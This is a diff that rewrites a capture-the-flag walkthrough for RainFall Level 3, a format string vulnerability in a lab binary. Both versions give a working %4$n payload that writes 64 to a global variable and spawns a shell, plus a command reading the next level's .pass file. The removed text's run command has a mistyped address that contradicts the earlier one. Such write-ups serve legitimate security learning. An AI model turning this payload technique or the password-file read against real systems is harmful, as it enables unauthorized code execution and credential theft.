@@ -1,126 +1,65 @@
-=== Level3 Walkthrough ===
+# RainFall - Level 3: Format String Exploit
 
---- Protections ---
+## Overview
+Level 3 contains a **format string vulnerability** in function `v`. The program reads user input and passes it directly to `printf()`, which means our input is treated as a format string instead of plain text.
 
-NX disabled   → shellcode execution possible
-No canary     → buffer overflow possible (not needed here)
-No RELRO      → memory sections writable
-No PIE        → addresses are fixed and predictable
-No ASLR       → global variable address never changes
+This gives us control over `printf()` and lets us read or write memory.
 
---- What the program does ---
+## Why This Works
+The program also checks a global variable at `0x0804988c`.
+If that variable becomes `0x40`, the program follows the success path and calls `system()`.
 
-main() simply calls v() and returns.
+So the goal is simple:
+- find the right stack offset
+- use `%n` to write `64` to `0x0804988c`
 
-v() does 4 things:
-1. reads input with fgets(buffer, 512, stdin)
-   → safe, limits input to 512 bytes → no buffer overflow possible
-2. prints input with printf(buffer)
-   → VULNERABLE → format string attack
-3. checks if global variable m equals 64
-4. if m == 64 → system("/bin/sh") → shell opens
+## Finding the Offset
+A common test is:
 
---- Finding the vulnerability ---
+```bash
+python -c 'print "AAAA." + ".%p" * 10'
+```
 
-1. Disassembled v() in GDB and found:
-   - fgets() → safe, no overflow possible
-   - printf(buffer) → no format string argument → vulnerable
-   - cmp $0x40,%eax → checks if m == 64 (0x40 = 64)
-   - system(0x804860d) → confirmed with GDB:
-     x/s 0x804860d → "/bin/sh"
+If `AAAA` appears as `0x41414141` in the output, you know where your input starts on the stack.
+For this challenge, the useful offset is `4`.
 
-2. Found global variable m:
-   x/xw 0x804988c → value: 0x00000000 (m = 0)
-   → we need to change m from 0 to 64
+## Building the Payload
+The payload has three parts:
 
---- Understanding the format string vulnerability ---
+1. **Target address**: `0x0804988c`
+2. **Padding**: `60` bytes, so the printed length becomes `64`
+3. **Write command**: `%4$n`
 
-Normal safe printf:
-   printf("%s", buffer) → buffer is treated as plain data
+The final layout is:
 
-Vulnerable printf:
-   printf(buffer) → buffer is treated as format string
-   → user controls format specifiers
+```text
+[address][padding][%4$n]
+```
 
-Dangerous format specifiers:
-   %x → reads and prints next stack value as hex
-   %n → writes number of chars printed so far
-        into the address pointed to by stack value
+Little-endian address:
 
---- Finding our input position on the stack ---
+```bash
+\x8c\x98\x04\x08
+```
 
-Sent test input:
-   python -c 'print "AAAA %x %x %x %x"' | ./level3
+## Exploit Command
 
-Output:
-   AAAA 200 b7fd1ac0 b7ff37d0 41414141
-                                ↑
-                           0x41414141 = "AAAA" in hex
-                           → our input is at position 4!
+```bash
+(python -c 'print "\x8c\x98\x04\x08" + "Q" * 60 + "%4$n"'; cat) | ./level3
+```
 
-Explanation:
-   Each %x makes printf read the next stack value.
-   We recognized 41414141 (AAAA in hex) at position 4
-   → our buffer sits at stack position 4
-   → we can target it directly with %4$n
+The `cat` keeps the shell open after the exploit runs.
 
---- The exploit strategy ---
+## After Exploitation
+If the exploit works, you should get a shell as the next level user.
 
-Goal: write 64 into m at address 0x804988c
+```bash
+whoami
+cat /home/user/level4/.pass
+```
 
-Plan:
-1. put address of m at start of input
-   → it lands at position 4 on stack
-2. add 60 A's as padding
-   → 4 bytes (address) + 60 bytes = 64 chars total
-3. use %4$n
-   → goes to position 4
-   → finds address 0x804988c
-   → writes 64 (chars printed so far) into m
-4. m == 64 → check passes → shell opens
-
---- Address of m in little endian ---
-
-m address:    0x804988c
-little endian: \x8c\x98\x04\x08
-(x86 stores addresses with least significant byte first)
-
-Why 60 A's?
-   address = 4 bytes printed
-   need 64 total before %n
-   padding = 64 - 4 = 60 bytes
-
---- Payload ---
-
-python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"'
-
-Breaking it down:
-\x8c\x98\x04\x08  → address of m (4 bytes, position 4 on stack)
-A*60              → padding to reach 64 chars total
-%4$n              → write 64 into address at position 4 (m)
-
---- Running the exploit ---
-
-(python -c 'print "\x8c\x88\x94\x08" + "A"*60 + "%4$n"'; cat) | ./level3
-
-cat keeps stdin open so shell stays interactive.
-
---- Execution flow ---
-
-printf reads our input as format string
-         ↓
-prints address (4 bytes) + 60 A's = 64 chars
-         ↓
-%4$n → reads position 4 → finds 0x804988c
-     → writes 64 into 0x804988c
-         ↓
-m = 64 ✅
-         ↓
-if (m == 64) → TRUE
-         ↓
-system("/bin/sh") → shell as level4 🎉
-
---- Result ---
-
-whoami → level4
-cat /home/user/level4/.pass → [password]
+## Summary
+- Vulnerability: format string
+- Goal: overwrite global value at `0x0804988c`
+- Required value: `0x40`
+- Main trick: use `%4$n` with the correct stack offset
